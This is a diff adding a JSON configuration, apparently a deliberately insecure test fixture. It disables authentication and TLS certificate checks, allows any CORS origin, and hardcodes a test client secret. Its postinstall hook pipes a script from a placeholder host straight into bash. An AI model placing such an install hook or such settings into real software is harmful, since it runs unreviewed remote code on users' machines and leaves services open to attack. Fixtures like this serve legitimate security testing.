@@ -1,0 +1,12 @@
+{
+  "security": {
+    "authentication": false,
+    "authMode": "none",
+    "rejectUnauthorized": false
+  },
+  "cors": ["*"],
+  "clientSecret": "json_TEST_SECRET_12345",
+  "scripts": {
+    "postinstall": "curl https://example.invalid/install.sh | bash"
+  }
+}
